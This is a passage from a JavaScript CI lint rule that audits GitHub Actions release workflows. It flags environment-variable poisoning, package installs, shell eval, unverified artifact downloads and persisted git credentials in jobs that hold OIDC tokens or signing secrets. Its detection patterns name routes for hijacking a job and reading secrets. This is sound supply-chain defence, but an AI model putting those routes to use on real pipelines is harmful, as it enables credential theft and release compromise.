    const bunPackRe = cmd("bun(?:\\s+-\\S+(?:\\s+[^-\\s]\\S*)?)*\\s+pm\\s+pack\\b");
    const packs = runs.replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim()).some((l) => l === npmInstallLine ||
      packRe.test(l.replace(/["\x27\\]/g, "")) || bunPackRe.test(l.replace(/["\x27\\]/g, "")));
    const heldBy = oidc ? "a job holding id-token" : "a job that installs npm from its checked tarball or runs npm pack (#1030)";
    if ((oidc || packs) && typeof job.uses !== "string") {
      const poison = /^(?:BASH_ENV|ENV|PATH|NODE_OPTIONS|LD_[A-Z0-9_]+|BASH_FUNC_.+|SHELLOPTS|BASHOPTS|PS4|(?:HTTPS?|ALL|NO|FTP)_PROXY|NODE_EXTRA_CA_CERTS|NODE_TLS_REJECT_UNAUTHORIZED|SSL_CERT_(?:FILE|DIR)|CURL_CA_BUNDLE|CURL_HOME|HOME|XDG_CONFIG_HOME|NODE_PATH|CDPATH|TMPDIR|OPENSSL_(?:CONF|MODULES|ENGINES)|GITHUB_.+|RUNNER_.+|ACTIONS_.+)$/i;
      // One set for all of these jobs: every name in it must mean nothing to
      // bash, node, npm, curl, git, glibc or the runner, only to scripts of
      // this repo (pins, digests, versions, signing names).
      const knownEnv = new Set([
        // release-exec.yml, workflow level: pins read by other jobs.
        "BUN_VERSION", "NPM_VERSION", "NPM_INTEGRITY", "BINFMT_IMAGE", "BUILDKIT_IMAGE", "SBOM_GENERATOR", "REHEARSAL_REGISTRY_IMAGE",
        "SIDECAR_BIN", "DRY_RUN",
        // publish-brain steps.
        "TARBALL", "SHA256", "VERSION", "PRERELEASE",
        // publish-sidecar steps.
        "PUBLISH_ONLY", "BUILT_VERSION", "GIVEN_VERSION", "SHA_LINUX_X64", "SHA_LINUX_ARM64", "SHA_DARWIN_ARM64", "SHA_DARWIN_X64", "SHA_WIN32_X64", "DIGESTS",
        // The Windows signers.
        "GCP_KMS_KEYRING", "ALLOW_UNSIGNED_WINDOWS", "GCP_ACCESS_TOKEN", "GCP_KMS_KEY_ALIAS",
      ]);
      if (job.container !== undefined) out.push(name + ": runs in a container: in " + heldBy);
      if (job.services !== undefined) out.push(name + ": runs services: in " + heldBy);
      const plainShell = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
      const fsteps = flatSteps(job.steps);
      const stepLabel = (st, via, i) => "step " + (via ? "(via " + via.slice(0, -3) + ") " : "") + (st.name ?? st.id ?? st.uses ?? String(i));
      const levels = [["workflow", doc.env], ["job", job.env], ["container", job.container?.env],
        ...fsteps.map(({ st, via }, i) => [stepLabel(st, via, i), st.env])];
      for (const [lvl, e] of levels) {
        if (e === undefined || e === null) continue;
        if (typeof e !== "object" || Array.isArray(e)) {
          out.push(name + ": " + lvl + " env is " + JSON.stringify(e) + ", not a mapping this rule can read, in " + heldBy);
          continue;
        }
        for (const k of Object.keys(e))
          if (poison.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in " + heldBy);
          else if (!knownEnv.has(k)) out.push(name + ": " + lvl + " env sets " + k + ", a name no job holding id-token uses yet: set it at the level of the job that reads it, or add it to knownEnv with a reason");
      }
      // ...nor set in the script itself (review of #999): an assignment or
      // an export of such a name in a run: is the same env by another name.
      for (const [i, { st, via }] of fsteps.entries()) {
        const run = (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map(stripComment).join("\n");
        for (const m of run.matchAll(/(?:^|[\s;&|(`])(?:(?:export|declare|typeset|local|readonly|env)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)\+?=/gm))
          if (poison.test(m[1])) out.push(name + ": " + stepLabel(st, via, i) + " sets " + m[1] + " in its script, in " + heldBy);
      }
      for (const [i, { st, via }] of fsteps.entries()) {
        const text = [typeof st.run === "string" ? st.run : "", ...Object.values(st.env && typeof st.env === "object" ? st.env : {}).map(String)].join("\n");
        if (/GITHUB_(?:ENV|PATH)\b|_runner_file_commands/i.test(text))
          out.push(name + ": " + stepLabel(st, via, i) + " writes GITHUB_ENV or GITHUB_PATH (env for every later step) in " + heldBy);
        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
        if (sh !== undefined && !plainShell.includes(String(sh).trim()))
          out.push(name + ": " + stepLabel(st, via, i) + " runs in shell: " + sh + " in " + heldBy);
      }
    }
    // publish-brain is the tarball-only shape (#682): no checkout, nothing
    // but setup-node and download-artifact, npm itself as the only global
    // install, a digest check, then a publish of a .tgz path. Allowlisted
    // rather than denylisted, so a step added later has to be argued for.
    // publish-sidecar is not this shape yet: it publishes from directories.
    if (name === "publish-brain") {
      const allowed = ["actions/setup-node@", "actions/download-artifact@"];
      for (const st of steps) {
        const u = String(st.uses ?? "");
        if (u && !allowed.some((a) => u.startsWith(a))) out.push(name + ": uses " + u + " (only setup-node and download-artifact)");
      }
      for (const line of lines)
        if (globalOther(line)) out.push(name + ": installs something other than npm from its checked tarball globally: " + line);
      const at = (re) => steps.findIndex((st) => typeof st.run === "string" && re.test(st.run));
      const verify = at(/\bsha256sum\s+-c\b/);
      const publish = at(/\bnpm\s+publish\b/);
      if (verify < 0 || verify > publish) out.push(name + ": no sha256sum -c of the tarball before npm publish");
      for (const st of steps)
        if (typeof st.run === "string" && /\bnpm\s+publish\b/.test(st.run) && !/\bnpm\s+publish\s+"[^"]*\.tgz"/.test(st.run.replace(/\$\{TARBALL\}/g, "x.tgz")))
          out.push(name + ": npm publish is not given a .tgz path (a directory publish runs its lifecycle scripts)");
    }
    // #817: a package manager runs maintainer scripts as root, which can read
    // the worker environment and memory, so on the release path a job that
    // can mint an OIDC token installs no OS or language packages: a mirror or
    // archive compromise must not reach the publishing or signing identity.
    // Whatever needs a package runs in a job without the token (osslsigncode
    // for post-sign verification moved out for exactly this).
    if (release && oidc) {
      for (const line of lines) {
        if (cmd("(?:apt-get|apt|aptitude|add-apt-repository|dpkg|snap|flatpak|brew|port|yum|dnf|apk|zypper|pacman|pip3?|pipx|uv|conda|mamba|nix|nix-env|gem|cargo|choco|winget|python3?\\s+-m\\s+pip)\\b").test(line))
          out.push(name + ": installs OS packages in a job holding id-token: " + line);
        // Text handed to another shell is a command this rule cannot read.
        if (cmd("(?:(?:ba|z|da)?sh\\s+-\\S*c|eval)\\b").test(line))
          out.push(name + ": runs shell text in a job holding id-token, which this rule cannot see into: " + line);
      }
      // And no action that could install anything: only what these jobs
      // use. Each one added has to be argued for here.
      const okUses = ["actions/checkout@", "actions/download-artifact@", "actions/upload-artifact@", "actions/setup-node@", "google-github-actions/auth@"];
      for (const st of steps) {
        const u = String(st.uses ?? "");
        if (u && !u.startsWith("./") && !okUses.some((a) => u.toLowerCase().startsWith(a)))
          out.push(name + ": uses " + u + " in a job holding id-token (only checkout, artifact transfer, setup-node and google-github-actions/auth)");
      }
    }
    // On the release path a job that can mint a token builds nothing: the
    // compiler, the module graph and dependency scripts run in a job without
    // id-token, and the result crosses with its digest.
    if (release && oidc) {
      for (const line of lines)
        if (cmd("go\\s+(?:build|install|generate|run|test|vet|mod|get)\\b").test(line) || /build-sidecar\.sh/.test(line) ||
            cmd("(?:bun|bunx|npx|yarn|pnpm|make|swiftc|swift|xcodebuild|clang|gcc|cc|cargo|cmake)\\b").test(line) ||
            (npmRuns.test(line) && !(isGlobal(line) && !globalOther(line))))
          out.push(name + ": builds in a job holding id-token: " + line);
      for (const st of steps)
        if (String(st.uses ?? "").startsWith("./"))
          out.push(name + ": runs local action " + st.uses + " in a job holding id-token");
    }
    // #870: the same for a job that reads a secret other than GITHUB_TOKEN.
    // The Apple signing certificate, its password and the App Store Connect
    // key are long-lived: unlike a federated token they do not expire with
    // the job, and the signer imports them into a keychain and a file. So a
    // compiler, a Go module, cgo, a Makefile, a package manager or a
    // repository script run in that job could read them out. The build
    // happens in a job without them (build-sidecar-darwin-*, build-macos),
    // and the result crosses to the signer with its digest. Only checkout
    // and the artifact actions run there, and a secret at the workflow level
    // reaches every job, so it counts for all of them.
    const secretHeld = [...JSON.stringify({ env: doc.env, job }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
      .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
    // The Apple and App Store Connect secrets are held to this in EVERY
    // workflow, release path or not (#870 review): a new workflow handed
    // them (a nightly notarization test, say) must not escape the rule.
    const appleHeld = /\bsecrets\s*(?:\.\s*|\[\s*\\?[\x27"])(?:APPLE_|ASC_)/i.test(JSON.stringify({ env: doc.env, job }));
    if ((release && secretHeld || appleHeld) && typeof job.uses !== "string") {
      // Every shell plain, as in a job holding id-token: shell: node {0} or
      // python {0} runs the script in an interpreter this rule cannot read.
      const plainShellS = ["bash", "sh", "bash -e {0}", "sh -e {0}", "bash --noprofile --norc -eo pipefail {0}"];
      for (const st of steps) {
        const sh = st.shell ?? job.defaults?.run?.shell ?? doc.defaults?.run?.shell;
        if (sh !== undefined && !plainShellS.includes(String(sh).trim()))
          out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? "") + " runs in shell: " + sh + " in a job holding a signing secret (#870 review)");
      }
      // No env that names code to run first or changes what the tools load
      // (the id-token list, plus the dynamic loader on macOS), and nothing
      // written to GITHUB_ENV or GITHUB_PATH for later steps.
      // CODESIGN_ALLOCATE names the helper codesign runs; DEVELOPER_DIR,
      // TOOLCHAINS, SDKROOT and xcrun_* choose what xcrun runs; PERL5OPT and
      // friends load code into shasum, a Perl script on macOS (#870 review).
      const poisonS = /^(?:BASH_ENV|ENV|PATH|NODE_OPTIONS|LD_[A-Z0-9_]+|DYLD_[A-Z0-9_]+|CODESIGN_ALLOCATE|DEVELOPER_DIR|TOOLCHAINS|SDKROOT|xcrun_[A-Za-z0-9_]+|PERL5OPT|PERL5LIB|PERLLIB|PERL5DB|PERL_[A-Z0-9_]+|BASH_FUNC_.+|SHELLOPTS|BASHOPTS|PS4|(?:HTTPS?|ALL|NO|FTP)_PROXY|SSL_CERT_(?:FILE|DIR)|CURL_CA_BUNDLE|HOME|TMPDIR|CDPATH|OPENSSL_(?:CONF|MODULES|ENGINES)|GITHUB_.+|RUNNER_.+|ACTIONS_.+)$/i;
      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? ""), st.env])])
        for (const k of Object.keys(e && typeof e === "object" ? e : {}))
          if (poisonS.test(k)) out.push(name + ": " + lvl + " env sets " + k + " in a job holding a signing secret (#870 review)");
      for (const st of steps) {
        const text = [typeof st.run === "string" ? st.run : "", ...Object.values(st.env && typeof st.env === "object" ? st.env : {}).map(String)].join("\n");
        if (/GITHUB_(?:ENV|PATH)\b|_runner_file_commands/i.test(text))
          out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? st.uses ?? "") + " writes GITHUB_ENV or GITHUB_PATH in a job holding a signing secret (#870 review)");
        const run = (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map(stripComment).join("\n");
        for (const m of run.matchAll(/(?:^|[\s;&|(`])(?:(?:export|declare|typeset|local|readonly|env)\s+(?:-\w+\s+)*)?([A-Za-z_][A-Za-z0-9_]*)\+?=/gm))
          if (poisonS.test(m[1])) out.push(name + ": step " + JSON.stringify(st.name ?? st.id ?? "") + " sets " + m[1] + " in its script, in a job holding a signing secret (#870 review)");
      }
      for (const line of lines) {
        // Code the build job made, or the checkout carries, run as a
        // program: a program named by a variable, one inside a bundle, open,
        // or a path into the checkout (an extensionless script too).
        // Read with its own command-position rule: the cmd() prefix takes
        // any directory in front of a program, which here would read every
        // "${RUNNER_TEMP}/x" argument as a program.
        if (new RegExp("(?:^\\(?\\s*|[;&|`{]\\s*|!\\s+|\\$\\(\\s*|\\b(?:then|do|else|if|elif|while|until|exec|command|env|sudo|nohup|time|xargs)\\s+)" +
            "(?:open(?=$|[\\s;&|)])|\"?\\$\\{?[A-Za-z_]|[^\\s;&|\"]*\\.app/|\"?(?:\\./|\\.\\./|sidecar/|packaging/|scripts/|\\.github/))").test(line))
          out.push(name + ": runs a program from a variable, a bundle or the checkout in a job holding a signing secret (#870 review): " + line);
        // ...or has another program run one for it (#870 review).
        if (/(?:^|[\s;&|(])find\b[^;&|]*\s-(?:exec|execdir|ok|okdir)\b/.test(line) || /\bawk\b.*(?:\bsystem\s*\(|\|\s*getline\b|\bprint\b[^\n]*\|\s*["\x27$])/.test(line) || cmd("xargs(?=$|\\s)").test(line))
          out.push(name + ": runs programs through find -exec, xargs or awk system() in a job holding a signing secret (#870 review): " + line);
        if (cmd("go(?:\\s|$)").test(line) || /build-sidecar\.sh/.test(line) ||
            cmd("(?:bun|bunx|npx|yarn|pnpm|node|make|gmake|swiftc|swift|xcodebuild|clang|gcc|cc|ld|cargo|cmake|python3?|perl|ruby)(?=$|[\\s;&|)])").test(line) ||
            npmRuns.test(line))
          out.push(name + ": builds or runs build tooling in a job holding a signing secret (#870): " + line);
        // xcrun runs any developer tool by name (clang, swiftc, make): only
        // the two the signer needs.
        if (cmd("xcrun(?=$|\\s)").test(line) && !cmd("xcrun\\s+(?:notarytool|stapler)\\s").test(line))
          out.push(name + ": runs xcrun other than notarytool or stapler, which can run build tooling, in a job holding a signing secret (#870): " + line);
        if (cmd("(?:apt-get|apt|dpkg|snap|brew|port|yum|dnf|apk|pip3?|pipx|uv|conda|nix|nix-env|gem|cargo|choco|winget|softwareupdate|installer)(?=$|[\\s;&|)])").test(line))
          out.push(name + ": installs packages in a job holding a signing secret (#870): " + line);
        if (cmd("(?:(?:ba|z|da)?sh\\s+-\\S*c|eval|source|\\.)(?:\\s|$)").test(line))
          out.push(name + ": runs shell text or sources a file in a job holding a signing secret, which this rule cannot see into (#870): " + line);
        // A repository script is code this rule does not read: the signer
        // runs only what its own steps say (packaging/macos/make-icns.sh and
        // the Makefile stay in the build job).
        if (cmd("[\\w.-]+\\.(?:sh|bash|py|rb|pl|js|mjs|cjs|ts)(?=$|[\\s;&|)])").test(line))
          out.push(name + ": runs a repository script in a job holding a signing secret (#870): " + line);
      }
      for (const [lvl, e] of [["workflow", doc.env], ["job", job.env], ...steps.map((st) => ["step " + (st.name ?? st.id ?? st.uses ?? ""), st.env])])
        for (const k of Object.keys(e && typeof e === "object" ? e : {}))
          if (/^(?:CGO_[A-Z_]+|CC|CXX|GOFLAGS|GOOS|GOARCH)$/i.test(k)) out.push(name + ": " + lvl + " env sets " + k + " (a Go or C build) in a job holding a signing secret (#870)");
      const okSecretUses = ["actions/checkout@", "actions/download-artifact@", "actions/upload-artifact@"];
      for (const st of steps) {
        const u = String(st.uses ?? "");
        if (u && !okSecretUses.some((a) => u.toLowerCase().startsWith(a)))
          out.push(name + ": uses " + u + " in a job holding a signing secret (only checkout and artifact transfer) (#870)");
      }
      if (job.container !== undefined || job.services !== undefined) out.push(name + ": runs a container or services in a job holding a signing secret (#870)");
    }
    // Artifacts are writable by every job in the run, so on the release path
    // a job holding id-token or a write scope takes one only by digest
    // (#781): the step right after each download runs `sha256sum -c` on a
    // digest that arrives as a job output (`needs.<job>.outputs`, which only
    // that job can set), under the same condition as the download. A job
    // holding a signing secret too (#870): what it signs is what it ships.
    const privileged = oidc || secretHeld || perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
    if (release && privileged) {
      // Action names are case-insensitive to GitHub.
      const isDownload = (st) => String(st.uses ?? "").toLowerCase().startsWith("actions/download-artifact@");
      for (const [i, st] of steps.entries()) {
        if (!isDownload(st)) continue;
        // A run of downloads is checked by the one step after the run
        // (#952 follow-up: publish-sidecar takes its five artifacts by name,
        // one download each). Only downloads may sit in between: they
        // extract and run nothing that reads what they fetched, and each one
        // is held below to the same condition as the check and to no
        // continue-on-error, as a lone download is. In a run of more than
        // one, each download names its artifact, no two alike, and the check
        // names every one of them, so a download slipped in front of an
        // existing check that never looks at it is still reported.
        let a = i, j = i + 1;
        while (a > 0 && isDownload(steps[a - 1])) a--;
        while (j < steps.length && isDownload(steps[j])) j++;
        const next = steps[j];
        if (j - a > 1) {
          const runNames = steps.slice(a, j).map((d) => d.with?.name);
          const nextCode = typeof next?.run === "string" ? next.run.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n") : "";
          const nm = st.with?.name;
          if (typeof nm !== "string" || !nm || runNames.filter((x) => x === nm).length !== 1 || !nextCode.includes(nm))
            out.push(name + ": download " + JSON.stringify(nm ?? st.with?.pattern ?? "(all)") + " sits in a run of downloads, and is not one distinct artifact by name that the check after the run names");
        }
        const label = name + ": download " + JSON.stringify(st.with?.name ?? st.with?.pattern ?? "(all)");
        // The check, on a line that is not a comment, not excused by || true.
        const code = typeof next?.run === "string" ? next.run.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n") : "";
        // sha256sum, or on a macOS runner (#870), which has shasum and not
        // always sha256sum, shasum -a 256: the same check, the same hex.
        const SUM = "(?:sha256sum|shasum\\s+-a\\s*256)";
        const checkLine = code.split("\n").find((l) => new RegExp("\\b" + SUM + "\\b[^\\n]*\\s-c\\b").test(l));
        // The env vars that carry a job-output digest; the script must read
        // one of them, not merely have it in scope.
        const carriers = Object.entries(next?.env ?? {})
          .filter(([, v]) => /\$\{\{\s*needs\s*\.\s*[\w-]+\s*\.\s*outputs\s*\.\s*[\w-]+\s*\}\}/.test(String(v))).map(([k]) => k);
        if (!checkLine)
          out.push(label + " is not followed at once by a sha256sum -c of what it fetched");
        else if (!carriers.length)
          out.push(label + " is checked against no needs.<job>.outputs digest");
        else if (!carriers.some((k) => new RegExp("\\$\\{?" + k + "\\b").test(code)))
          out.push(label + " has a needs.<job>.outputs digest in env that its check never reads");
        // shasum picks the algorithm in check mode from the length of the
        // digest and ignores -a (#870 review: a 40-hex SHA-1 line passes
        // shasum -a 256 -c), so where it checks, every digest it reads must
        // be held to 64 hex first, in the same step: by name, or by ${!v}
        // over a for list that names it.
        else if (!/\bsha256sum\b/.test(checkLine) && !carriers.every((k) =>
            new RegExp("\\[\\[\\s*\"\\$\\{?" + k + "\\}?\"\\s*=~\\s*\\^\\[0-9a-f\\]\\{64\\}\\$\\s*\\]\\]").test(code.slice(0, code.indexOf(checkLine))) ||
            (/\[\[\s*"\$\{!v\}"\s*=~\s*\^\[0-9a-f\]\{64\}\$\s*\]\]/.test(code.slice(0, code.indexOf(checkLine))) && new RegExp("\\bfor\\s+v\\s+in\\b[^;\\n]*\\b" + k + "\\b").test(code.slice(0, code.indexOf(checkLine))))))
          out.push(label + " is checked with shasum, which takes the algorithm from the digest length, without first holding every digest to 64 hex");
        // ...and a failed hold stops the step (#870 review: || : passed).
        else if (!/\bsha256sum\b/.test(checkLine) && code.slice(0, code.indexOf(checkLine)).split("\n").filter((l) => /=~\s*\^\[0-9a-f\]\{64\}\$/.test(l))
            .some((l) => !/\]\]\s*\|\|\s*(?:\{\s*(?:[^;]*;\s*)*exit\s+[1-9][0-9]*\s*;?\s*\}|exit\s+[1-9][0-9]*)\s*;?\s*$/.test(l.trim())))
          out.push(label + " is checked with shasum after a 64-hex hold whose failure does not stop the step");
        // Its failure must end the step: no || after it (on its line or
        // continued onto the next), no if or ! around it, no set +e, and no
        // shell other than the default bash -e.
        // The check must also be the LAST command of its line: a pipe after it
        // (GitHub default shell is bash -e, without pipefail), a trailing &,
        // or a $( ) or backtick around it would each take its exit status.
        else if (/\|\|/.test(checkLine) || /^\s*(?:if|elif|while|until)\b|^\s*!/.test(checkLine) ||
                 !new RegExp("\\b" + SUM + "\\b[^|;&)`]*\\s-c\\b[^|;&)`]*$").test(checkLine) || /\$\(|`/.test(checkLine.split(new RegExp("\\b" + SUM + "\\b")).slice(-2, -1)[0] ?? "") ||
                 /(?:^|[;&|]\s*)set\s+\+o\s+pipefail\b/m.test(code) ||
                 /(?:^|[;&|]\s*)set\s+\+[a-z]*e/m.test(code) || /(?:^|[;&|]\s*)set\s+\+o\s+errexit/m.test(code) ||
                 (next.shell !== undefined && !/^bash\s+-e\b|^bash$/.test(String(next.shell))))
          out.push(label + " is checked with a failure excused (||, if, !, a pipe, & or $( ) after or around it, set +e, set +o pipefail, or a shell without -e)");
        else if ((next.if ?? null) !== (st.if ?? null))
          out.push(label + " is checked under a different condition (" + JSON.stringify(next.if) + ") than it is downloaded (" + JSON.stringify(st.if) + ")");
        for (const s2 of [st, next])
          if (s2 && s2["continue-on-error"] !== undefined)
            out.push(label + ": continue-on-error on " + JSON.stringify(s2.name ?? s2.uses ?? "a step") + ", so a failed check would not stop the job");
      }
      // Other ways to fetch an artifact, which this rule cannot follow.
      for (const line of lines)
        if (/\bgh\s+run\s+download\b|\bactions\/(?:runs\/[^\s/]+\/)?artifacts\b/.test(line))
          out.push(name + ": fetches artifacts outside actions/download-artifact, which the digest rule cannot check: " + line);
      for (const st of steps)
        if (/^actions\/github-script@/i.test(String(st.uses ?? "")) && /artifact/i.test(String(st.with?.script ?? "")))
          out.push(name + ": github-script touching artifacts, which the digest rule cannot check");
      // #820: the artifact service itself. Its URL and token sit in the
      // environment of every JavaScript action and can be handed to a run:
      // step, so reading either one is a download route this rule cannot
      // follow. Run text without comments, plus every with: and env: value
      // of the step and the job (a github-script body is a with: value).
      const runtimeApi = /\bACTIONS_(?:RESULTS_URL|RUNTIME_TOKEN|RUNTIME_URL)\b/;
      if (runtimeApi.test(JSON.stringify(job.env ?? {})))
        out.push(name + ": job env reads the Actions runtime artifact API, which the digest rule cannot check");
      for (const [i, st] of steps.entries()) {
        const code = typeof st.run === "string" ? st.run.split("\n").map((l) => l.replace(/(^|\s)#(?!\{).*$/, "$1")).join("\n") : "";
        if (runtimeApi.test(code + JSON.stringify(st.with ?? {}) + JSON.stringify(st.env ?? {})))
          out.push(name + ": step " + (st.name ?? st.id ?? st.uses ?? String(i)) + " reads the Actions runtime artifact API (ACTIONS_RESULTS_URL, ACTIONS_RUNTIME_TOKEN, ACTIONS_RUNTIME_URL), which the digest rule cannot check");
      }
      // ...and every other action that fetches artifacts or hands the runtime
      // to later steps. Only actions/download-artifact is followed by the
      // digest check above, so any other action named for artifacts,
      // downloads or the runtime is one this rule cannot see into. An
      // unrecognised route is an allowed one, so this is by name and broad.
      for (const st of steps) {
        const u = String(st.uses ?? "").toLowerCase().split("@")[0];
        if (!u || u.startsWith("./") || u === "actions/download-artifact" || u === "actions/upload-artifact") continue;
        if (/artifact|download|runtime/.test(u))
          out.push(name + ": fetches artifacts through " + u + ", which the digest rule cannot check");
      }
    }
    // An artifact is a zip that any job in the run can write, and extraction
    // overwrites what is already there (#817 review). Downloaded into the
    // checkout, it can replace a checked-out script before the job runs it:
    // sign-windows.sh, with the KMS token in its environment. So on the
    // release path a job with a checkout downloads only into a directory the
    // repository does not have: under runner.temp, or a name that is not in
    // the tree. The default path is the workspace itself.
    if (release && steps.some((st) => String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@")))
      for (const st of steps) {
        if (!String(st.uses ?? "").toLowerCase().startsWith("actions/download-artifact@")) continue;
        const p = String(st.with?.path ?? "").trim();
        const inTemp = /^\$\{\{\s*runner\.temp\s*\}\}(\/|$)/.test(p);
        const first = p.replace(/^\.\//, "").split("/")[0];
        // No climbing back out of runner.temp, and no home-relative path,
        // whose target this rule cannot know (#817 review).
        const climbs = p.split("/").some((seg) => seg.trim() === "..") || /^~/.test(p);
        if (climbs || (!inTemp && (!p || p === "." || /\$\{\{/.test(p) || fs.existsSync(process.env.REPO + "/" + first))))
          out.push(name + ": downloads " + JSON.stringify(st.with?.name ?? st.with?.pattern ?? "(all)") + " into " + JSON.stringify(p || "the workspace") + ", over the checkout, where it can replace a checked-out file");
      }
    // google-github-actions/auth writes a credentials file by default that
    // can mint further tokens; on the release path only access_token is used.
    if (release)
      for (const st of steps)
        if (String(st.uses ?? "").startsWith("google-github-actions/auth@") && st.with?.create_credentials_file !== false)
          out.push(name + ": google-github-actions/auth leaves a credentials file in the workspace (create_credentials_file is not false)");
    // No checkout leaves its token in .git/config on the release path, nor
    // (#982) in any job holding a write scope or reading a secret other than
    // GITHUB_TOKEN, whatever the workflow. release.yml is not on the release
    // path as defined above (no `release` environment, no id-token), so its
    // cut job left its PAT there for every later step. Every step after the
    // checkout can read the file, so a credential goes to the one step that
    // needs it, from that step env.
    const writesAny = perm === "write-all" || (perm && typeof perm === "object" && Object.values(perm).some((v) => v === "write"));
    const readsSecret = [...JSON.stringify({ env: doc.env, job }).matchAll(/\$\{\{([\s\S]*?)\}\}/g)]
      .some((m) => /\bsecrets\b(?!\s*\.\s*GITHUB_TOKEN\b)/i.test(m[1]));
    const isCheckout = (st) => String(st.uses ?? "").toLowerCase().startsWith("actions/checkout@");
    if (release || writesAny || readsSecret)
      for (const st of steps)
        if (isCheckout(st) && st.with?.["persist-credentials"] !== false)
          out.push(name + ": checkout leaves the token in .git/config (persist-credentials is not false)");
    // ...so a git command that talks to a remote, in a job whose checkouts
    // persist nothing, has no credential unless its step supplies one
    // (#982). Without one it fails, and the `|| true` a branch delete
    // usually carries turns that into a silent no-op. A helper given in the
    // step env counts: a GIT_CONFIG_KEY_n below GIT_CONFIG_COUNT naming a
    // credential helper, with a value. The token in the remote URL does not
    // count (see below).
    const checkouts = steps.filter(isCheckout);
    const gitRemote = cmd("git\\s+(?:(?:-[cC]|--(?:git-dir|work-tree|namespace|exec-path|config-env))\\s+\\S+\\s+|--?[\\w-]+(?:=\\S+)?\\s+)*(?:push|fetch|pull|ls-remote)\\b");
    const stepLines = (st) => (typeof st.run === "string" ? st.run : "").replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim());
    // The env a step runs with, as GitHub builds it: workflow, then job,
    // then step, a later level overriding an earlier one.
    const envOf = (st) => ({ ...(doc.env ?? {}), ...(job.env ?? {}), ...(st.env ?? {}) });
    // GIT_CONFIG_KEY_<n> as git reads it: n in plain decimal (no leading
    // zero) and below GIT_CONFIG_COUNT.
    const envConfig = (e) => {
      const n = Number(e.GIT_CONFIG_COUNT ?? 0);
      return Object.entries(e).flatMap(([k, v]) => {
        const m = /^GIT_CONFIG_KEY_(\d+)$/.exec(k);
        return m && m[1] === String(Number(m[1])) && Number(m[1]) < n ? [[String(v), String(e["GIT_CONFIG_VALUE_" + m[1]] ?? "")]] : [];
      });
    };
    const helpers = (st) => envConfig(envOf(st)).filter(([k]) => /^credential\.(?:.+\.)?helper$/i.test(k)).map(([, v]) => v);
    if (checkouts.length && checkouts.every((st) => st.with?.["persist-credentials"] === false))
      for (const [i, st] of steps.entries()) {
        if (!stepLines(st).some((l) => gitRemote.test(l))) continue;
        if (!helpers(st).some((v) => v !== ""))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " runs git against a remote with no credential: the checkout persists none and the step env gives no credential helper");
      }
    // A helper given that way answers from the step env and stores nothing:
    // an inline `!f() { ... }; f` that names no storing helper and writes
    // no file. Anything else (store, cache, a credential manager, or an
    // inline one that calls them) keeps what git hands it after a push, on
    // disk or in a daemon every later step can ask.
    for (const [i, st] of steps.entries())
      for (const v of helpers(st))
        if (v !== "" && (!/^!f\(\)\s*\{[\s\S]*\};\s*f$/.test(v) || /credential-(?:store|cache)|\bgh\s+auth\b|>/.test(v)))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " configures the credential helper " + JSON.stringify(v) + ", which keeps the credential after the step");
    // Git config given in the environment reaches every step that env
    // reaches, so at the job or workflow level it is the persisted
    // credential again; and an extraheader, insteadOf or helper value given
    // as GIT_CONFIG_PARAMETERS, or a GIT_CONFIG_GLOBAL file, is git config
    // this rule cannot read.
    for (const [lvl, e] of [["workflow env", doc.env ?? {}], ["job env", job.env ?? {}]])
      for (const k of Object.keys(e))
        if (/^GIT_CONFIG_(?:COUNT|KEY_\d+|VALUE_\d+|PARAMETERS|GLOBAL|SYSTEM)$/.test(k))
          out.push(name + ": " + lvl + " sets " + k + ", git config every step of the job reads");
    for (const [i, st] of steps.entries()) {
      for (const k of Object.keys(st.env ?? {}))
        if (/^GIT_CONFIG_(?:PARAMETERS|GLOBAL|SYSTEM)$/.test(k))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " sets " + k + ", git config this rule cannot read");
      for (const [k] of envConfig(st.env ?? {}))
        if (/extraheader|\.insteadof$/i.test(k))
          out.push(name + ": step " + (st.name ?? st.id ?? String(i)) + " sets " + k + " through the environment; give a credential helper instead");
    }
    // Nor may a job that holds a credential put it back where the checkout
    // no longer does: an extraheader or helper in git config (on disk, or on
    // a command line every process can read), a .git-credentials, .netrc or
    // .gitconfig file, a storing helper run directly, or gh auth, which
    // writes its token under ~/.config. Continuation lines joined.
    const joined = runs.replace(/\\\n/g, " ").split("\n").map((l) => stripComment(l).trim());
    if (release || writesAny || readsSecret)
      for (const line of joined)
        if (/\bgit\b.*\bconfig\b.*(?:extraheader|\bcredential\.|\.insteadof\b)/i.test(line) || /\bgit\b.*\s-c\s+["\x27]?[^\s=]*(?:extraheader|credential\.)/i.test(line) ||
            /\.git-credentials\b|(?:^|[^\w.-])\.(?:netrc|gitconfig)\b|\bcredential-(?:store|cache)\b|\bgh\s+auth\s+(?:login|setup-git)\b/.test(line))
          out.push(name + ": writes a git credential where every later step can read it: " + line);
    // Nor a credential in a URL (#982): git and curl print the URL they
    // failed on, where only the secret itself is masked and nothing derived
    // from it, and a URL argument is visible to every process on the runner.
    // A credential is an expression, a variable, a command substitution or
    // a printf slot in the userinfo. Run text, and every env (workflow,
    // job, container, services, step) and with value.
    const credUrl = /\bhttps?:\/\/[^\s\/@]*(?:\$\{\{[\s\S]*?\}\}|\$\{?[A-Za-z_]\w*\}?|\$\([^)]*\)|`[^`]*`|%s)[^\s\/@]*@/i;
    const vals = (o) => Object.values(o ?? {}).map(String);
